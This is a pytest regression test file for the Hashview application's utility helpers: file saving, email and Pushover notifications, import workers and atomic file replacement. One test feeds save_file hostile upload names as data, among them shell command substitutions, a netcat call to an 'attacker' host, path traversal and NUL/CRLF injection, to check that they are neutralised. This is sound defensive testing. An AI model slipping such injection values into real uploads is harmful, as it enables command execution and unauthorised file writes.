"""Regression tests for utils helpers (function-coverage batch: utils).

Covers the helpers that remained uncovered after the triage pass:
save_file, send_email, send_html_email, send_pushover, getTimeFormat, and
wordlist_import.run_import_async. External boundaries (Flask-Mail, the Pushover
HTTP call, the import worker, threads) are mocked.
"""

import errno
import os

import pytest

import hashview.utils.utils as u
import hashview.utils.wordlist_import as wi
from hashview.models import JobTasks, Rules, Tasks, Users, Wordlists, db


def _user(**kw):
    defaults = dict(first_name="A", last_name="B", email_address="a@e.com",
                    password="x" * 60, admin=True)
    defaults.update(kw)
    user = Users(**defaults)
    db.session.add(user)
    db.session.commit()
    return user


# --- getTimeFormat (pure) ---------------------------------------------------

def test_get_time_format_buckets():
    assert u.getTimeFormat(30) == "less then 1 minute"
    assert u.getTimeFormat(120) == "2 minute(s)"
    assert u.getTimeFormat(7200) == "2 hour(s)"
    assert u.getTimeFormat(172800) == "2 day(s)"
    assert u.getTimeFormat(1209600) == "2 week(s)"


# --- save_file --------------------------------------------------------------

def test_save_file_writes_and_returns_path(app):
    class _FormFile:
        filename = "upload.txt"

        def save(self, dst):
            with open(dst, "wb") as fh:
                fh.write(b"data")

    path = u.save_file("control/tmp", _FormFile())
    try:
        assert path.endswith(".txt")
        assert os.path.exists(path)
    finally:
        if os.path.exists(path):
            os.remove(path)


def test_save_file_ignores_attacker_controlled_filename(app):
    """The uploaded filename is fully attacker-controlled and must never reach
    the on-disk name: shell metacharacters and path separators are dropped in
    favor of a random ``<hex>.txt`` name, and the write stays inside the target
    directory (no path-traversal write). Guards CWE-22/CWE-78 (GHSA report)."""
    import re

    class _EvilFile:
        def __init__(self, filename):
            self.filename = filename

        def save(self, dst):
            with open(dst, "wb") as fh:
                fh.write(b"payload")

    control_tmp = os.path.realpath(os.path.join(app.root_path, "control", "tmp"))
    for evil in ["$(id)/x.txt", "../../../../tmp/evil/y.txt", "a;touch pwned;.txt",
                 "`whoami`/z", "|nc attacker 1234/x",
                 # Windows-style traversal: os.path.split on POSIX treats "\"
                 # as an ordinary character, so a secure_filename-style fix
                 # must strip it too.
                 "..\\..\\..\\evil.txt",
                 # Absolute path: os.path.join(base, "/abs") DISCARDS base.
                 "/etc/cron.d/evil.txt",
                 # Embedded NUL: open() raises ValueError if it reaches a path.
                 "evil\x00.txt",
                 # CRLF: header injection if a name flows into Content-Disposition.
                 "evil\r\n.txt",
                 # Degenerate names secure_filename collapses to "".
                 "", ".", "..",
                 # Fullwidth solidus (U+FF0F) and RTL override (U+202E):
                 # bypass naive separator checks / spoof displayed names.
                 "／..／etc／passwd", "‮gnp.evil.txt"]:
        path = u.save_file("control/tmp", _EvilFile(evil))
        try:
            base = os.path.basename(path)
            assert re.fullmatch(r"[0-9a-f]{16}\.txt", base), base
            assert os.path.realpath(path).startswith(control_tmp + os.sep)
            assert os.path.exists(path)
        finally:
            if os.path.exists(path):
                os.remove(path)


# --- email helpers ----------------------------------------------------------

def test_send_email_uses_mail_extension(app):
    sent = []
    app.extensions["mail"].send = lambda msg: sent.append(msg)
    user = _user()
    assert u.send_email(user, "subj", "body") is True
    assert sent and sent[0].subject == "subj"
    assert user.email_address in sent[0].recipients


def test_send_email_returns_false_on_error(app):
    def _boom(msg):
        raise RuntimeError("smtp down")
    app.extensions["mail"].send = _boom
    user = _user()
    assert u.send_email(user, "subj", "body") is False


def test_send_html_email_sets_html_body(app):
    sent = []
    app.extensions["mail"].send = lambda msg: sent.append(msg)
    user = _user()
    u.send_html_email(user, "subj", "<b>hi</b>")
    assert sent and sent[0].html == "<b>hi</b>"


# --- send_pushover ----------------------------------------------------------

def test_send_pushover_skips_without_keys(app, monkeypatch):
    calls = []
    monkeypatch.setattr(u.requests, "post", lambda *a, **kw: calls.append(a))
    user = _user(pushover_app_id=None, pushover_user_key=None)
    u.send_pushover(user, "s", "m")
    assert calls == []  # no HTTP call when keys are missing


def test_send_pushover_posts_payload(app, monkeypatch):
    captured = {}

    class _Resp:
        status_code = 200

        def json(self):
            return {"status": 1}

    def _post(url, params=None, timeout=None):
        captured["url"] = url
        captured["params"] = params
        return _Resp()

    monkeypatch.setattr(u.requests, "post", _post)
    user = _user(pushover_app_id="appid", pushover_user_key="userkey")
    u.send_pushover(user, "Title", "Message body")
    assert "pushover.net" in captured["url"]
    assert captured["params"]["token"] == "appid"
    assert captured["params"]["user"] == "userkey"
    assert captured["params"]["message"] == "Message body"


# --- run_import_async -------------------------------------------------------

def test_run_import_async_runs_within_app_context(app, monkeypatch):
    seen = {}

    def _fake_run_import(passed_app, filenames, owner_id):
        # The body runs inside `with app.app_context()`, so this must be true.
        from flask import has_app_context
        seen["ctx"] = has_app_context()
        seen["args"] = (filenames, owner_id)
        return {"ok": True}

    monkeypatch.setattr(wi, "run_import", _fake_run_import)
    result = wi.run_import_async(app, ["a.txt"], 7)
    assert result == {"ok": True}
    assert seen["ctx"] is True
    assert seen["args"] == (["a.txt"], 7)


# --- resource_in_running_task -----------------------------------------------

def _rule(owner_id, **kw):
    defaults = dict(name="r", owner_id=owner_id, path="/tmp/x.rule", size=1, checksum="a" * 64)
    defaults.update(kw)
    row = Rules(**defaults)
    db.session.add(row)
    db.session.commit()
    return row


def _wordlist(owner_id, **kw):
    defaults = dict(name="w", owner_id=owner_id, type="static", path="/tmp/x.gz",
                     size=1, byte_size=1, checksum="b" * 64)
    defaults.update(kw)
    row = Wordlists(**defaults)
    db.session.add(row)
    db.session.commit()
    return row


def _task(owner_id, **kw):
    defaults = dict(name="t", owner_id=owner_id, hc_attackmode=0, loopback=False)
    defaults.update(kw)
    row = Tasks(**defaults)
    db.session.add(row)
    db.session.commit()
    return row


def _jobtask(task_id, status):
    jt = JobTasks(job_id=1, task_id=task_id, status=status)
    db.session.add(jt)
    db.session.commit()
    return jt


def test_resource_in_running_task_false_when_unreferenced(app):
    user = _user()
    _rule(user.id)
    assert u.resource_in_running_task(rule_id=999999) is False
    assert u.resource_in_running_task(wl_id=999999) is False


def test_resource_in_running_task_false_when_no_running_jobtask(app):
    user = _user()
    rule = _rule(user.id)
    task = _task(user.id, rule_id=rule.id)
    _jobtask(task.id, "Queued")
    assert u.resource_in_running_task(rule_id=rule.id) is False


def test_resource_in_running_task_true_for_rule(app):
    user = _user()
    rule = _rule(user.id)
    task = _task(user.id, rule_id=rule.id)
    _jobtask(task.id, "Running")
    assert u.resource_in_running_task(rule_id=rule.id) is True


def test_resource_in_running_task_true_for_wordlist_wl_id_2(app):
    """wl_id_2 (the second wordlist slot, e.g. combinator attacks) counts too."""
    user = _user()
    wl = _wordlist(user.id)
    task = _task(user.id, wl_id_2=wl.id)
    _jobtask(task.id, "Running")
    assert u.resource_in_running_task(wl_id=wl.id) is True


# --- replace_file_atomic -----------------------------------------------------

def test_replace_file_atomic_same_filesystem(tmp_path):
    src = tmp_path / "src.txt"
    dst = tmp_path / "dst.txt"
    src.write_text("new content")
    dst.write_text("old content")
    u.replace_file_atomic(str(src), str(dst))
    assert dst.read_text() == "new content"
    assert not src.exists()


def test_replace_file_atomic_falls_back_on_exdev(tmp_path, monkeypatch):
    """Only the FIRST os.replace (src -> dst) is cross-device; the fallback's
    own os.replace(tmp, dst) is same-directory and must succeed normally."""
    src = tmp_path / "src.txt"
    dst = tmp_path / "dst.txt"
    src.write_text("new content")
    dst.write_text("old content")

    real_replace = u.os.replace
    calls = []

    def _replace_first_call_exdev(a, b):
        calls.append((a, b))
        if len(calls) == 1:
            raise OSError(errno.EXDEV, "cross-device link")
        return real_replace(a, b)

    monkeypatch.setattr(u.os, "replace", _replace_first_call_exdev)
    u.replace_file_atomic(str(src), str(dst))
    assert dst.read_text() == "new content"
    assert not src.exists()
    assert len(calls) == 2


def test_replace_file_atomic_reraises_other_oserror(tmp_path, monkeypatch):
    src = tmp_path / "src.txt"
    dst = tmp_path / "dst.txt"
    src.write_text("new content")
    dst.write_text("old content")

    def _raise_other(a, b):
        raise OSError(errno.EACCES, "permission denied")

    monkeypatch.setattr(u.os, "replace", _raise_other)
    with pytest.raises(OSError):
        u.replace_file_atomic(str(src), str(dst))
